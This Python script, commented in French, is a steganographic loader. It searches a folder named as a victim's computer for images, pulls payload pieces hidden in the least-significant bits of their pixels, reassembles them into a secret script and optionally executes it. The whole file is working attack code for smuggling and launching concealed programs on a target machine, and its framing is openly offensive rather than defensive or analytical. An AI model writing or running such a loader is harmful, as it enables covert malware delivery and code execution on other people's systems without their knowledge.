#!/usr/bin/env python3
# extraire_et_executer.py
"""
Parcourt un répertoire (ordinateur_victime), extrait les payloads insérés via LSB,
reconstruit le script original et (optionnel) l'exécute.

Usage:
  python extraire_et_executer.py --root ordinateur_victime --out reconstruction --run

Note:
- Compatible avec l'en-tête: b"STEG|%04d|%04d|%08d|"
- Recherche récursive des images (.png, .jpg, .jpeg)
"""

from pathlib import Path
from PIL import Image
import argparse
import sys
import subprocess

MAGIC = b"STEG|"

def ensure_rgb(img: Image.Image) -> Image.Image:
    if img.mode in ("RGB", "RGBA"):
        return img.convert("RGB")
    return img.convert("RGB")

def bits_to_bytes(bits):
    """Convert list of bits (MSB first per byte) -> bytes."""
    out = bytearray()
    for i in range(0, len(bits), 8):
        if len(bits) - i < 8:
            break
        byte = 0
        for b in bits[i:i+8]:
            byte = (byte << 1) | (b & 1)
        out.append(byte)
    return bytes(out)

def extract_header_and_payload_from_image(img_path: Path, max_header_bytes=512):
    """
    Lit les LSBs d'une image et tente d'extraire l'en-tête puis la payload complète.
    Retour:
      None -> pas de payload détectée
      (index:int, total:int, data:bytes) -> morceau extrait
    """
    try:
        with Image.open(img_path) as im:
            im = ensure_rgb(im)
            pixels = list(im.getdata())
            flat = []
            for (r, g, b) in pixels:
                flat.extend([r, g, b])
            # Lire d'abord quelques octets pour détecter header
            header_bits = [(flat[i] & 1) for i in range(min(len(flat), max_header_bytes * 8))]
            header_bytes = bits_to_bytes(header_bits)
            if not header_bytes.startswith(MAGIC):
                return None
            # On cherche le positionnement du 4e '|' dans l'interprétation ASCII
            try:
                header_text = header_bytes.decode("ascii", errors="ignore")
            except Exception:
                return None
            # header_text attendu: "STEG|IIII|TTTT|LLLLLLLL|..."
            # trouver la fin de l'en-tête (position du 4ème '|')
            parts = header_text.split("|")
            if len(parts) < 5:
                # header plus long que max_header_bytes ? essayer d'augmenter (rare)
                # fallback: tenter de lire plus (double)
                max_header_bytes2 = max_header_bytes * 2
                header_bits = [(flat[i] & 1) for i in range(min(len(flat), max_header_bytes2 * 8))]
                header_bytes = bits_to_bytes(header_bits)
                header_text = header_bytes.decode("ascii", errors="ignore")
                parts = header_text.split("|")
                if len(parts) < 5:
                    return None
            # parse values
            try:
                # parts[0] == 'STEG', parts[1]=idx, parts[2]=tot, parts[3]=len
                idx = int(parts[1])
                tot = int(parts[2])
                ln = int(parts[3])
            except Exception:
                return None
            # Now determine exact header byte-length by re-encoding the header prefix
            header_prefix = f"STEG|{idx:04d}|{tot:04d}|{ln:08d}|"
            header_len = len(header_prefix.encode("ascii"))
            total_bits_needed = (header_len + ln) * 8
            if total_bits_needed > len(flat):
                # payload larger than capacity -> invalid
                return None
            # read exactly total_bits_needed LSBs
            payload_bits = [(flat[i] & 1) for i in range(total_bits_needed)]
            payload_bytes = bits_to_bytes(payload_bits)
            data = payload_bytes[header_len:header_len+ln]
            return (idx, tot, data)
    except Exception:
        return None

def list_images_recursive(root: Path):
    exts = (".png", ".jpg", ".jpeg")
    return [p for p in root.rglob("*") if p.suffix.lower() in exts and p.is_file()]

def reconstruct_script(pieces: dict, out_script: Path):
    """
    pieces: dict index->bytes
    Ecrit out_script (crée dossier si besoin).
    """
    if not pieces:
        raise ValueError("Aucune pièce fournie pour reconstruction.")
    max_index = max(pieces.keys())
    missing = [i for i in range(1, max_index+1) if i not in pieces]
    if missing:
        raise ValueError(f"Pièces manquantes: {missing}")
    blob = b"".join(pieces[i] for i in range(1, max_index+1))
    out_script.parent.mkdir(parents=True, exist_ok=True)
    out_script.write_bytes(blob)

def compute_sha256_bytes(data: bytes):
    import hashlib
    return hashlib.sha256(data).hexdigest()

def parse_args():
    p = argparse.ArgumentParser(description="Extraire payloads stégo et reconstruire le script.")
    p.add_argument("--root", dest="root", required=True, help="Dossier racine à scanner (ex: ordinateur_victime)")
    p.add_argument("--out", dest="outdir", default="reconstruction", help="Dossier de sortie (ex: reconstruction)")
    p.add_argument("--run", dest="run_after", action="store_true", help="Exécuter le script reconstruit")
    p.add_argument("--scan", dest="scan_target", default=".", help="Argument optionnel passé au script reconstruit s'il accepte un paramètre")
    return p.parse_args()

def main():
    args = parse_args()
    root = Path(args.root)
    outdir = Path(args.outdir)
    out_script = outdir / "script_secret.py"

    if not root.exists():
        print(f"Racine introuvable: {root}", file=sys.stderr)
        sys.exit(1)

    imgs = list_images_recursive(root)
    if not imgs:
        print(f"Aucune image trouvée dans {root}", file=sys.stderr)
        sys.exit(2)

    pieces = {}
    expected_total = None
    for img in imgs:
        res = extract_header_and_payload_from_image(img)
        if res is None:
            continue
        idx, tot, data = res
        if expected_total is None:
            expected_total = tot
        elif expected_total != tot:
            print(f"Avertissement: total incohérent {expected_total} vs {tot} dans {img}")
        if idx in pieces:
            print(f"Doublon pour index {idx} trouvé dans {img} — on garde la première occurrence.")
            continue
        pieces[idx] = data
        print(f"Trouvé morceau {idx}/{tot} dans {img}")

    if not pieces:
        print("Aucun payload trouvé.")
        sys.exit(3)

    try:
        reconstruct_script(pieces, out_script)
    except Exception as e:
        print(f"Erreur reconstruction: {e}", file=sys.stderr)
        sys.exit(4)

    print(f"Script reconstruit: {out_script}")

    # compute and compare sha256 if available
    data = out_script.read_bytes()
    sha_recon = compute_sha256_bytes(data)
    sha_file = outdir / "sha256_original.txt"
    print(f"SHA256 reconstruit : {sha_recon}")
    if sha_file.exists():
        original_sha = sha_file.read_text().strip()
        print(f"SHA256 original    : {original_sha}")
        print("Verification :", "OK " if sha_recon == original_sha else "ECHEC ")

    if args.run_after:
        # Execute the reconstructed script in a subprocess (safer than exec in current process)
        cmd = [sys.executable, str(out_script), args.scan_target]
        print("Execution du script reconstruit :", " ".join(cmd))
        r = subprocess.run(cmd)
        sys.exit(r.returncode)

if __name__ == "__main__":
    main()
